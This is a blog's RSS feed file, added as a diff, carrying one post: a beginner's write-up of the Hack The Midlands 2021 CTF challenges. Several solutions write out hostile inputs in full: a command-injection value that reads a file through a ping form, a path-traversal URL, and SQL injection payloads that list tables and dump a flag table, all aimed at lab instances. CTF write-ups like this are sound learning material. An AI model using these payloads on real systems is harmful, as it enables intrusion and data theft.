@@ -1,0 +1,141 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>The Tymscar Blog</title><link>blog.tymscar.com/</link><description>Recent content on The Tymscar Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 31 Oct 2021 18:12:13 +0100</lastBuildDate><atom:link href="blog.tymscar.com/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Midlands CTF 2021</title><link>blog.tymscar.com/posts/hackthemidlandsctf2021/</link><pubDate>Sun, 31 Oct 2021 18:12:13 +0100</pubDate><guid>blog.tymscar.com/posts/hackthemidlandsctf2021/</guid><description>HackTheMidlands is a 24-hour hackathon, or “creative marathon”, which was founded in 2016. I used to participate back in the day, and I&amp;rsquo;ve even won a prize before, here you can find a video about it! 📷
+CTFs🏁: Being a programmer at heart I&amp;rsquo;ve never played seriously with capture the flag challenges before, but because I am busy with work I did not have the time and energy to participate in the coding part of the hackathon, so I thought I&amp;rsquo;ll give the CTF a try!</description><content>&lt;p>&lt;a href="https://hackthemidlands.com/">HackTheMidlands&lt;/a> is a 24-hour hackathon, or “creative marathon”, which was founded in 2016.
+I used to participate back in the day, and I&amp;rsquo;ve even won a prize before, &lt;a href="https://www.youtube.com/watch?v=mvLXkCgsXik">here&lt;/a> you can find a video about it! 📷&lt;/p>
+&lt;h3 id="ctfs">CTFs🏁:&lt;/h3>
+&lt;p>Being a programmer at heart I&amp;rsquo;ve never played seriously with &lt;a href="https://www.hackthebox.com/blog/what-is-ctf">capture the flag&lt;/a> challenges before, but because I am busy with work I did not have the time and energy to participate in the coding part of the hackathon, so I thought I&amp;rsquo;ll give the CTF a try! It was a lot of fun for someone starting out with CTFs but with a good grasp of &lt;code>*nix&lt;/code> systems, programming, and web development!&lt;/p>
+&lt;h1 id="writeup-of-the-challenges-of-this-year-">Writeup of the challenges of this year 💻:&lt;/h1>
+&lt;p>There were 7 challenges in total this year, with varying difficulties denoted by points from &lt;code>5&lt;/code> to &lt;code>20&lt;/code>.&lt;/p>
+&lt;p>Some of the challenges required the &lt;code>hacker&lt;/code> to download some file and mess around with it in some way and the others presented the user with a hosted &lt;code>docker&lt;/code> instance. In the case of the docker instance, the hacker did not have to employ any other tools besides his browser. I found this to be very nice for a new user.&lt;/p>
+&lt;h1 id="challenge-1-find-me-5pt">Challenge #1: Find Me (5pt)&lt;/h1>
+&lt;p>Description:&lt;/p>
+&lt;pre tabindex="0">&lt;code>There&amp;#39;s something about this image that is more than meets the eye.
+&lt;/code>&lt;/pre>&lt;p>Attached to this was an image:
+&lt;img src="blog.tymscar.com/htm-2021/findme.png" alt="findMe">&lt;/p>
+&lt;p>Photography is one of my most loved hobbies so I knew this had to be one of three things.&lt;/p>
+&lt;ol>
+&lt;li>There was something hidden in the text when you open up the image as a text file. This was not it. The file looked like gibberish with no sight of the flag:
+&lt;img src="blog.tymscar.com/htm-2021/findMeGibberish.png" alt="findMeGibberish">&lt;/li>
+&lt;li>Sometimes when you adjust the file&amp;rsquo;s brightness or contrast you can see some hidden text. This was unlikely to be the case because then you would have to type the CTF flag manually. I tried it regardless without any success.&lt;/li>
+&lt;li>The file had some &lt;a href="https://en.wikipedia.org/wiki/Exif">EXIF&lt;/a> data about it. I went to an online &lt;a href="http://metapicz.com/#landing">EXIF viewer&lt;/a> and lo and behold, the flag &lt;code>HTM{EXIF_GRABBED}&lt;/code> was there:
+&lt;img src="blog.tymscar.com/htm-2021/findMeExif.png" alt="findMeExif">&lt;/li>
+&lt;/ol>
+&lt;h1 id="challenge-2-pingit-5pt">Challenge #2: PingIT (5pt)&lt;/h1>
+&lt;p>Description:&lt;/p>
+&lt;pre tabindex="0">&lt;code>TotallySecure Limited have developed an internal tool to check the availability of a host on their network.
+Can you find any vulnerabilities with this?
+**Note, any flags are located in /home/cmnatic/ with the formatting of HTM{}**
+&lt;/code>&lt;/pre>&lt;p>This is what the website looked like upon visiting it:&lt;/p>
+&lt;p>&lt;img src="blog.tymscar.com/htm-2021/pingitsite.png" alt="pingitsite">&lt;/p>
+&lt;p>It`s quite clear that the website takes the user input and passes it to the ping command directly, something like this:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ping 127.0.0.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In &lt;code>bash&lt;/code> if you want to run two commands one after the other, you can use the &lt;code>;&lt;/code> sign between them. So I tried to run &lt;code>uname&lt;/code> which should return the kernel name I am running on that machine. And it did!&lt;/p>
+&lt;p>&lt;img src="blog.tymscar.com/htm-2021/pingmeuname.png" alt="pingmeuname">&lt;/p>
+&lt;p>It says in the description that the flag is located in &lt;code>/home/cmnatic&lt;/code>. I just don&amp;rsquo;t know what the name of the file is, so I ran&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>1; ls /home/cmnatic
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And the server told me that the file is called &lt;code>flag.txt&lt;/code>. Should`ve known&amp;hellip;
+All that is left now is to read the flag with:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>1; cat /home/cmnatic/flag.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Tada! We got the flag: &lt;code>HTM{COMMAND_INJECTION}&lt;/code>&lt;/p>
+&lt;h1 id="challenge-3-commitment-issues-15pt">Challenge #3: Commitment Issues (15pt)&lt;/h1>
+&lt;p>Description:&lt;/p>
+&lt;pre tabindex="0">&lt;code>Joe Bloggs -
+developer extroadinare, has some commitment issues and seems to share too much.
+Can you help him prevent this in the future?
+&lt;/code>&lt;/pre>&lt;p>Attached we have a zip file, with a git project inside.
+I tried running &lt;code>grep&lt;/code> over the file and looking for &lt;code>HTM{&lt;/code> but I couldn`t find anything.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tymscar@machine:/home/Tymscar/BikeIT$ grep -rni &lt;span style="color:#e6db74">&amp;#34;HTM{&amp;#34;&lt;/span> *
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tymscar@machine:/home/Tymscar/BikeIT$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It was pretty clear based on the fact that this was a git project and the challenge title that the flag had something to do with the commits inside of it, so I ran &lt;code>git log&lt;/code> and I could see that there was actually another commit which could hide the flag.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tymscar@machine:/home/Tymscar/BikeIT$ git log
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit eed89b082d6ae5694caa55a4bfe232f866311634 &lt;span style="color:#f92672">(&lt;/span>HEAD -&amp;gt; main, origin/main&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Ben &lt;span style="color:#f92672">(&lt;/span>CMNatic&lt;span style="color:#f92672">)&lt;/span> &amp;lt;ben@cmnatic.co.uk&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Wed Oct &lt;span style="color:#ae81ff">27&lt;/span> 12:12:20 &lt;span style="color:#ae81ff">2021&lt;/span> +0100
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Update databaseconfig.php
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit b574d38d27ce5646bf69c28e02ac6f8656c19d2d
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Ben &lt;span style="color:#f92672">(&lt;/span>CMNatic&lt;span style="color:#f92672">)&lt;/span> &amp;lt;ben@cmnatic.co.uk&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Wed Oct &lt;span style="color:#ae81ff">27&lt;/span> 10:02:38 &lt;span style="color:#ae81ff">2021&lt;/span> +0100
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Initial Commit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>commit b9620c9fbfb1ee3714a79fc2d116bff03918a181
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Author: Ben &lt;span style="color:#f92672">(&lt;/span>CMNatic&lt;span style="color:#f92672">)&lt;/span> &amp;lt;ben@cmnatic.co.uk&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date: Wed Oct &lt;span style="color:#ae81ff">27&lt;/span> 09:58:52 &lt;span style="color:#ae81ff">2021&lt;/span> +0100
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Initial commit
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I switched to it, tried grepping for the flag again and, success: &lt;code>HTM{COMMITTED_CREDENTIALS}&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tymscar@machine:/home/Tymscar/BikeIT$ git checkout b574d38d27ce5646bf69c28e02ac6f8656c19d2d
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Note: switching to &lt;span style="color:#e6db74">&amp;#39;b574d38d27ce5646bf69c28e02ac6f8656c19d2d&amp;#39;&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HEAD is now at b574d38 Initial Commit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tymscar@machine:/home/Tymscar/BikeIT$ grep -rni &lt;span style="color:#e6db74">&amp;#34;HTM{&amp;#34;&lt;/span> *
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>php/databaseconfig.php:5:$password&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;HTM{COMMITTED_CREDENTIALS}&amp;#34;&lt;/span>; //change this
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="challenge-4totally-cool-bookings-10pt">Challenge #4:Totally Cool Bookings (10pt)&lt;/h1>
+&lt;p>Description:&lt;/p>
+&lt;pre tabindex="0">&lt;code>Totally Cool Bookings are excited to show off their new app!
+It makes bookings totally cool and easy.
+Find the vulnerability on their site to answer the flag.
+**Note, flags for this are with the formatting of HTM{}**
+and are located in a users home directory
+&lt;/code>&lt;/pre>&lt;p>This is what the website looked like upon visiting it:&lt;/p>
+&lt;p>&lt;img src="blog.tymscar.com/htm-2021/coolbookingsinital.png" alt="coolbookingsinital">&lt;/p>
+&lt;p>The first thing I noticed instantly while playing with the webpage was that when I went to the &lt;code>about&lt;/code> page, it would not load, but instead, it would error at the bottom of the page:
+&lt;img src="blog.tymscar.com/htm-2021/coolbookingserror.png" alt="coolbookingserror">&lt;/p>
+&lt;p>The error had a full path to where the page should&amp;rsquo;ve been &lt;code>/opt/web/about.html&lt;/code>. Does this mean we can just change the URL and relatively go back to root and then climb back up to the location of where the flag was in &lt;code>Challenge 2&lt;/code>? Let&amp;rsquo;s try: &lt;code>{dockerinstanceURL}/home?page=../../../home/cmnatic/flag.txt&lt;/code>
+&lt;img src="blog.tymscar.com/htm-2021/coolbookingssuccess.png" alt="coolbookingssuccess">&lt;/p>
+&lt;p>What do you know? We found the flag: &lt;code>HTM{INJECTION_SUCCESS}&lt;/code>!&lt;/p>
+&lt;h1 id="challenge-5-deep-dive-15pt">Challenge #5: Deep Dive (15pt)&lt;/h1>
+&lt;p>Description:&lt;/p>
+&lt;pre tabindex="0">&lt;code>The DevOps team left a flag behind.
+Can you re-assemble this and find the flag?
+Note, any flags are located in /home/cmnatic/ with the formatting of HTM{}
+&lt;/code>&lt;/pre>&lt;p>Attached we have a zip file, with a docker project inside. Normally, I would&amp;rsquo;ve tried to run the docker file and see where it would take me, but a simple&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>grep -rni &lt;span style="color:#e6db74">&amp;#34;HTM{.*}&amp;#34;&lt;/span> *
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>returned me the flag &lt;code>HTM{DOCKER_DIVE}&lt;/code> so I was happy enough:
+&lt;img src="blog.tymscar.com/htm-2021/deepdive.png" alt="deepdive">&lt;/p>
+&lt;h1 id="challenge-6-flag-checker-10pt">Challenge #6: Flag Checker (10pt)&lt;/h1>
+&lt;p>Description:&lt;/p>
+&lt;pre tabindex="0">&lt;code>The lazy developer has left this broken file behind.
+Can you find the flag?
+&lt;/code>&lt;/pre>&lt;p>Attached we have a zip file, with a single file inside.
+The first thing I did was try to see what kind of file it is:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tymscar@machine:/home/Tymscar/flagchecker$ file flagchecker
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flagchecker: assembler source, ASCII text
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Being an ASCII file, I did what you probably guessed:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>tymscar@machine:/home/Tymscar/flagchecker$ cat flagchecker | grep &lt;span style="color:#e6db74">&amp;#34;HTM{.*}&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HTM&lt;span style="color:#f92672">{&lt;/span>CORE_DU&lt;span style="color:#f92672">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And there it was, &lt;code>HTM{CORE_DU}&lt;/code>, the flag!&lt;/p>
+&lt;h1 id="challenge-7-address-book-20pt">Challenge #7: Address Book (20pt)&lt;/h1>
+&lt;p>Description:&lt;/p>
+&lt;pre tabindex="0">&lt;code>Alice is trying to find the contact details for **Joe Bloggs**.
+Can you help here?
+I hear the address book contains more then just contact details!
+&lt;/code>&lt;/pre>&lt;p>This is what the website looked like upon visiting it and searching for the person hinted in the description:&lt;/p>
+&lt;p>&lt;img src="blog.tymscar.com/htm-2021/addressbook.png" alt="addressbook">&lt;/p>
+&lt;p>Searching for any other random name did not yield any results. I knew this was accessing data inside of some sort of database, so I tried my hand at doing an SQL injection attack.
+My train of thought was that because this is a simple docker instance it might just use SQLite. If it does it should respond to &lt;code>sqlite_version()&lt;/code> with the version it has, if it doesn&amp;rsquo;t, then I could try other variants of SQL and their specific commands.&lt;/p>
+&lt;p>But how would I be able to run that?
+Well, I could assume that the SQL command on the backend looks something like this:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> sometablethatIdontknow &lt;span style="color:#66d9ef">where&lt;/span> name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;{USERINPUT}&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I can add anything as USERINPUT, so I will close out the quotes, get rid of the answer by &lt;code>AND&lt;/code>ing it with a false statement, and using a union to select the version I am looking for:&lt;/p>
+&lt;pre tabindex="0">&lt;code>blahblah&amp;#39; AND 1=2 UNION SELECT sqlite_version(), 1, 1 --
+&lt;/code>&lt;/pre>&lt;p>This interanlly it would look like:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> sometablethatIdontknow &lt;span style="color:#66d9ef">where&lt;/span> name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;blahblah&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">AND&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#66d9ef">UNION&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> sqlite_version(), &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e">--&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The other 2 &lt;code>1&lt;/code>&amp;rsquo;s there I need just to be able to fully populate the table on the website which needs 3 elements in total.&lt;/p>
+&lt;p>I got lucky! The database was in fact an SQLite database and it returned its version:
+&lt;img src="blog.tymscar.com/htm-2021/addressbookversion.png" alt="addressbookversion">&lt;/p>
+&lt;p>Now that we know what database there is, I can always query all the table names. To do that in SQL, my input became:&lt;/p>
+&lt;pre tabindex="0">&lt;code>blahblah&amp;#39; AND 1=2 UNION SELECT name, 1, 1 FROM sqlite_master WHERE type = &amp;#34;table&amp;#34; --
+&lt;/code>&lt;/pre>&lt;p>which in turn on the backend side looked something like:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> sometablethatIdontknow &lt;span style="color:#66d9ef">where&lt;/span> name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;blahblah&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">AND&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#66d9ef">UNION&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> name, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> sqlite_master &lt;span style="color:#66d9ef">WHERE&lt;/span> &lt;span style="color:#66d9ef">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#75715e">--&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This returned the name of the tables available in that database. There is a &lt;code>flag&lt;/code> table! That&amp;rsquo;s what we want. To list everything inside of it, we do the last injection:&lt;/p>
+&lt;pre tabindex="0">&lt;code>blahblah&amp;#39; AND 1=2 UNION SELECT *, 1, 1 FROM flag--
+&lt;/code>&lt;/pre>&lt;p>which then in turn on the backend side would look like:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> addressbook &lt;span style="color:#66d9ef">where&lt;/span> name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;blahblah&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">AND&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#66d9ef">UNION&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> flag&lt;span style="color:#75715e">--&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>That was it! The flag, &lt;code>HTM{ADDRESS_BOOK_INJECTION}&lt;/code> was mine!
+&lt;img src="blog.tymscar.com/htm-2021/addressbookflag.png" alt="addressbookflag">&lt;/p>
+&lt;h1 id="in-conclusion">In conclusion&lt;/h1>
+&lt;p>I enjoyed these challenges very much! The last one was especially hard because I had to poke around with SQL injection about which I heard before but I&amp;rsquo;ve never done myself.
+The best advice I could give to anybody that wants to try some of these is just &lt;code>go for it&lt;/code> and don&amp;rsquo;t be afraid to Google everything you don`t understand. After all, it is a great learning experience!&lt;/p>
+&lt;p>See you next time!&lt;/p></content></item></channel></rss>
